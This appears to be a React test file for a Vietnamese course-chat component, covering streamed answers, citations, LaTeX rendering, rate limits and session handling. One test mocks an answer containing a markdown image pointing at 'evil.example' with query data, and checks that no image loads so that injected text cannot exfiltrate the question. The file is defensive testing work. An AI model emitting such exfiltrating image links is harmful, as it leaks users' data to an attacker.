import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { parseChatEvents } from '../../../api'
import { CourseChat } from '../../../components/CourseChat'
import { sourceLabel } from '../../../lib/sourceLabel'

function event(name: string, data: unknown) {
  return `event: ${name}\ndata: ${JSON.stringify(data)}\n\n`
}

function stream(...pieces: string[]) {
  return new Response(new ReadableStream({
    start(controller) {
      pieces.forEach((piece) => controller.enqueue(new TextEncoder().encode(piece)))
      controller.close()
    },
  }), { status: 200, headers: { 'Content-Type': 'text/event-stream' } })
}

const saved = (content: string) => ({
  id: 'm1', role: 'assistant', content, citations: [{ chunk_id: 'c1', source_ref: 'Chương 3, trang 4' }],
})

async function ask(question: string) {
  await waitFor(() => expect(screen.getByLabelText('Câu hỏi của bạn')).toBeEnabled())
  await userEvent.type(screen.getByLabelText('Câu hỏi của bạn'), question)
  await userEvent.click(screen.getByRole('button', { name: 'Gửi câu hỏi' }))
}

describe('CourseChat', () => {
  const fetchMock = vi.fn()
  const latestMock = vi.fn()
  const newChatMock = vi.fn()

  beforeEach(() => {
    fetchMock.mockReset()
    latestMock.mockReset()
    newChatMock.mockReset()
    newChatMock.mockImplementation(async () => Response.json({ session_id: 's-new' }, { status: 201 }))
    latestMock.mockImplementation(async () => Response.json({ session_id: null, messages: [] }))
    // Loading the last conversation goes to its own mock, so fetchMock sees only the questions.
    vi.stubGlobal('fetch', (url: string, init: RequestInit) =>
      url.endsWith('/chat/latest') ? latestMock(url, init)
        : url.endsWith('/chat/sessions') ? newChatMock(url, init) : fetchMock(url, init))
    localStorage.setItem('auth', JSON.stringify({ token: 'old', refreshToken: 'r' }))
  })

  afterEach(() => {
    vi.unstubAllGlobals()
    localStorage.clear()
  })

  it('typesets the LaTeX of an answer instead of showing its source', async () => {
    // The answer of 2026-11-11 on AWS: "$\\alpha \\beta$" and the tuple of a DFA came out as raw LaTeX.
    const answer = 'Phép nối $\\alpha \\beta$ và DFA $M = (K, \\Sigma, \\delta, s, F)$.'
    fetchMock.mockResolvedValueOnce(stream(event('done', saved(answer))))
    const { container } = render(<CourseChat courseId="course-1" />)

    await ask('Biểu thức chính quy là gì?')
    await waitFor(() => expect(container.querySelectorAll('.katex')).toHaveLength(2))
    expect(container.textContent).not.toContain('$')
    expect(container.querySelector('.katex-error')).toBeNull()
  })

  it('loads no image an answer asks for, so injected text cannot send the question to another host', async () => {
    fetchMock.mockResolvedValueOnce(stream(event('done', saved('Trả lời. ![](https://evil.example/p?q=bi-mat)'))))
    const { container } = render(<CourseChat courseId="course-1" />)

    await ask('Hỏi')
    expect(await screen.findByText(/Trả lời\./)).toBeInTheDocument()
    expect(container.querySelector('img')).toBeNull()
  })

  it('shows a formula the model got wrong as its source, and the rest of the answer', async () => {
    fetchMock.mockResolvedValueOnce(stream(event('done', saved('Trước $\\frac{1}{$ sau.'))))
    const { container } = render(<CourseChat courseId="course-1" />)

    await ask('Hỏi')
    expect(await screen.findByText(/sau\./)).toBeInTheDocument()
    expect(container.textContent).toContain('Trước')
  })

  it('shows the answer with its sources and keeps the session for the next question', async () => {
    fetchMock.mockResolvedValueOnce(stream(event('session', { session_id: 's1' }), ': ping\n\n', event('delta', { text: 'Tiến ' }),
      event('delta', { text: 'trình' }), event('done', saved('Tiến trình là chương trình đang chạy.'))))
    fetchMock.mockResolvedValueOnce(stream(event('done', saved('Có.'))))
    render(<CourseChat courseId="course-1" />)

    await ask('Tiến trình là gì?')
    expect(await screen.findByText('Tiến trình là chương trình đang chạy.')).toBeInTheDocument()
    // Saved before the numbers were kept in the text: the sources are a row of numbers under it.
    expect(screen.getByRole('button', { name: 'Nguồn 1: Chương 3, trang 4' })).toBeInTheDocument()
    const [url, init] = fetchMock.mock.calls[0]
    expect(url).toBe('/api/courses/course-1/chat/stream')
    expect(init.headers.Authorization).toBe('Bearer old')

    await ask('Còn gì nữa?')
    await screen.findByText('Có.')
    expect(JSON.parse(fetchMock.mock.calls[1][1].body).session_id).toBe('s1')
  })

  it('shows each source as its number where it is cited, and opens the passage from it', async () => {
    fetchMock.mockResolvedValueOnce(stream(event('done', {
      id: 'm1', role: 'assistant', content: 'Tiến trình là chương trình đang chạy [S1].',
      citations: [{ chunk_id: 'c1', source_ref: '{"page": 4}', content: 'Một tiến trình là một chương trình đang thực thi.' }],
    })))
    render(<CourseChat courseId="course-1" />)

    await ask('Tiến trình là gì?')
    const marker = await screen.findByRole('button', { name: 'Nguồn 1' })
    expect(marker).toHaveTextContent('[1]')
    expect(screen.queryByText(/\[S1\]/)).not.toBeInTheDocument()
    await userEvent.click(marker)
    expect(screen.getByText('trang 4')).toBeInTheDocument()
    expect(screen.getByText('Một tiến trình là một chương trình đang thực thi.')).toBeInTheDocument()
  })

  it('shows the error the server sends once the answer has begun', async () => {
    fetchMock.mockResolvedValueOnce(stream(event('delta', { text: 'Một phần' }), event('error', { detail: 'Không tạo được câu trả lời.' })))
    render(<CourseChat courseId="course-1" />)

    await ask('Hỏi')

    expect(await screen.findByRole('alert')).toHaveTextContent('Không tạo được câu trả lời.')
    expect(screen.getByText('Một phần')).toBeInTheDocument()
  })

  it('keeps the question box closed until the answer has finished', async () => {
    let finish: (value: Uint8Array) => void = () => {}
    let close = () => {}
    fetchMock.mockResolvedValueOnce(new Response(new ReadableStream({
      start(controller) {
        controller.enqueue(new TextEncoder().encode(event('delta', { text: 'Đang viết' })))
        finish = (value) => controller.enqueue(value)
        close = () => controller.close()
      },
    }), { status: 200 }))
    render(<CourseChat courseId="course-1" />)

    await ask('Hỏi')

    await screen.findByText('Đang viết')
    expect(screen.getByRole('button', { name: 'Đang trả lời…' })).toBeDisabled()
    expect(screen.getByLabelText('Câu hỏi của bạn')).toBeDisabled()
    finish(new TextEncoder().encode(event('done', saved('Xong.'))))
    close()
    await screen.findByRole('button', { name: 'Gửi câu hỏi' })
  })

  it('says so when the connection ends before the answer does', async () => {
    fetchMock.mockResolvedValueOnce(stream(event('delta', { text: 'Dở' })))
    render(<CourseChat courseId="course-1" />)

    await ask('Hỏi')

    expect(await screen.findByRole('alert')).toHaveTextContent('Mất kết nối')
  })

  it('explains a busy server', async () => {
    fetchMock.mockResolvedValueOnce(new Response('{}', { status: 503 }))
    render(<CourseChat courseId="course-1" />)

    await ask('Hỏi')

    expect(await screen.findByRole('alert')).toHaveTextContent('Hệ thống đang bận')
  })

  it('tells a learner whose questions for the day are used up to come back tomorrow, not to slow down', async () => {
    const limit = 'Bạn đã hỏi đủ 30 câu hôm nay. Hãy quay lại vào ngày mai.'
    fetchMock.mockResolvedValueOnce(Response.json({ detail: limit }, { status: 429 }))
    render(<CourseChat courseId="course-1" />)

    await ask('Hỏi')
    expect(await screen.findByRole('alert')).toHaveTextContent(limit)
  })

  it('asks to slow down when the rate limiter refuses without a message', async () => {
    fetchMock.mockResolvedValueOnce(Response.json({ error: 'Rate limit exceeded: 20 per 1 minute' }, { status: 429 }))
    render(<CourseChat courseId="course-1" />)

    await ask('Hỏi')
    expect(await screen.findByRole('alert')).toHaveTextContent('Bạn thao tác quá nhanh')
  })

  it('renews an expired session and sends the question again', async () => {
    const axios = (await import('axios')).default
    const post = vi.spyOn(axios, 'post').mockResolvedValue({ data: { access_token: 'new', refresh_token: 'r2' } })
    fetchMock.mockResolvedValueOnce(new Response('{}', { status: 401 }))
    fetchMock.mockResolvedValueOnce(stream(event('done', saved('Đã trả lời.'))))
    render(<CourseChat courseId="course-1" />)

    await ask('Hỏi')

    await screen.findByText('Đã trả lời.')
    expect(fetchMock.mock.calls[1][1].headers.Authorization).toBe('Bearer new')
    post.mockRestore()
  })

  it('stops the stream when the page is left', async () => {
    fetchMock.mockReturnValueOnce(new Promise(() => {}))
    const { unmount } = render(<CourseChat courseId="course-1" />)
    await ask('Hỏi')
    await waitFor(() => expect(fetchMock).toHaveBeenCalled())

    unmount()

    expect(fetchMock.mock.calls[0][1].signal.aborted).toBe(true)
  })

  it('opens on the last conversation and carries on with its session', async () => {
    latestMock.mockImplementation(async () => Response.json({ session_id: 's9', messages: [
      { id: 'u1', role: 'user', content: 'Heap là gì?', citations: [] },
      saved('Heap là cây nhị phân.'),
      { id: 'u2', role: 'user', content: 'Câu hỏi bị lỗi', citations: [] },
    ] }))
    fetchMock.mockResolvedValueOnce(stream(event('done', saved('Có hai tính chất.'))))
    render(<CourseChat courseId="course-1" />)

    expect(await screen.findByText('Heap là cây nhị phân.')).toBeInTheDocument()
    expect(screen.getByText('Câu hỏi bị lỗi')).toBeInTheDocument()
    expect(latestMock.mock.calls[0][0]).toBe('/api/courses/course-1/chat/latest')
    await ask('Nó có mấy tính chất?')
    await screen.findByText('Có hai tính chất.')
    expect(JSON.parse(fetchMock.mock.calls[0][1].body).session_id).toBe('s9')
  })

  it('cannot send until the last conversation has loaded', async () => {
    let finish: (response: Response) => void = () => {}
    latestMock.mockImplementation(() => new Promise<Response>((resolve) => { finish = resolve }))
    render(<CourseChat courseId="course-1" />)

    expect(screen.getByText('Đang tải cuộc trò chuyện…')).toBeInTheDocument()
    expect(screen.getByLabelText('Câu hỏi của bạn')).toBeDisabled()
    finish(Response.json({ session_id: null, messages: [] }))
    await waitFor(() => expect(screen.getByLabelText('Câu hỏi của bạn')).toBeEnabled())
  })

  it('still lets you ask when the last conversation fails to load, in a new session', async () => {
    latestMock.mockImplementation(async () => new Response(null, { status: 500 }))
    fetchMock.mockResolvedValueOnce(stream(event('done', saved('Có.'))))
    render(<CourseChat courseId="course-1" />)

    expect(await screen.findByText('Không tải được cuộc trò chuyện trước.')).toBeInTheDocument()
    await ask('Heap?')
    await screen.findByText('Có.')
    expect(JSON.parse(fetchMock.mock.calls[0][1].body).session_id).toBeUndefined()
  })

  it('opens the new conversation on the server, so a reload brings it back', async () => {
    latestMock.mockImplementation(async () => Response.json({ session_id: 's9', messages: [saved('Heap là cây nhị phân.')] }))
    fetchMock.mockResolvedValueOnce(stream(event('done', saved('Stack là LIFO.'))))
    render(<CourseChat courseId="course-1" />)

    await screen.findByText('Heap là cây nhị phân.')
    await userEvent.click(screen.getByRole('button', { name: 'Cuộc trò chuyện mới' }))
    await waitFor(() => expect(newChatMock).toHaveBeenCalledWith(expect.stringContaining('/courses/course-1/chat/sessions'), expect.objectContaining({ method: 'POST' })))
    await ask('Stack là gì?')
    await screen.findByText('Stack là LIFO.')
    expect(JSON.parse(fetchMock.mock.calls[0][1].body).session_id).toBe('s-new')
  })

  it('starts a new conversation without the old session even when the server cannot open one', async () => {
    newChatMock.mockImplementation(async () => new Response(null, { status: 500 }))
    latestMock.mockImplementation(async () => Response.json({ session_id: 's9', messages: [
      { id: 'u1', role: 'user', content: 'Heap là gì?', citations: [] }, saved('Heap là cây nhị phân.'),
    ] }))
    fetchMock.mockResolvedValueOnce(stream(event('session', { session_id: 's10' }), event('done', saved('Stack là LIFO.'))))
    render(<CourseChat courseId="course-1" />)

    await screen.findByText('Heap là cây nhị phân.')
    await userEvent.click(screen.getByRole('button', { name: 'Cuộc trò chuyện mới' }))
    expect(screen.queryByText('Heap là cây nhị phân.')).not.toBeInTheDocument()
    await ask('Stack là gì?')
    await screen.findByText('Stack là LIFO.')
    expect(JSON.parse(fetchMock.mock.calls[0][1].body).session_id).toBeUndefined()
  })
})

describe('sourceLabel', () => {
  it('reads the stored location', () => {
    expect(sourceLabel('{"page": 27, "heading": "Process Termination", "extraction_method": "text_layer"}')).toBe('Process Termination, trang 27')
    expect(sourceLabel('{"slide_index": 3}')).toBe('slide 3')
    expect(sourceLabel('{"extraction_method": "text_layer"}')).toBe('Tài liệu môn học')
  })

  it('names every page a chunk crosses, not only the first', () => {
    expect(sourceLabel('{"spans": [{"page": 9, "heading": "Process State"}, {"page": 10}]}')).toBe('Process State, trang 9–10')
    expect(sourceLabel('{"spans": [{"page": 9}, {"page": 11}, {"page": 12}, {"page": 11}]}')).toBe('trang 9, 11–12')
    expect(sourceLabel('{"spans": [{"slide_index": 4, "slide_title": "Deadlock"}, {"slide_index": 5}]}')).toBe('Deadlock, slide 4–5')
  })

  it('gives audio and video the time they cover', () => {
    expect(sourceLabel('{"start_ms": 750000, "end_ms": 790500}')).toBe('12:30–13:10')
    expect(sourceLabel('{"spans": [{"start_ms": 3600000, "end_ms": 3605000}, {"start_ms": 3605000, "end_ms": 3725000}]}')).toBe('1:00:00–1:02:05')
  })
})

describe('parseChatEvents', () => {
  it('keeps an event cut in two pieces for the next read', () => {
    const whole = event('delta', { text: 'a' })
    const first = parseChatEvents(whole.slice(0, 10))
    expect(first.events).toEqual([])
    expect(parseChatEvents(first.rest + whole.slice(10)).events).toEqual([{ name: 'delta', data: { text: 'a' } }])
  })

  it('reports a garbled frame as a broken connection instead of a JSON error', () => {
    expect(() => parseChatEvents('event: delta\ndata: {"text": "a\n\n')).toThrow('Mất kết nối trước khi có đủ câu trả lời')
  })
})
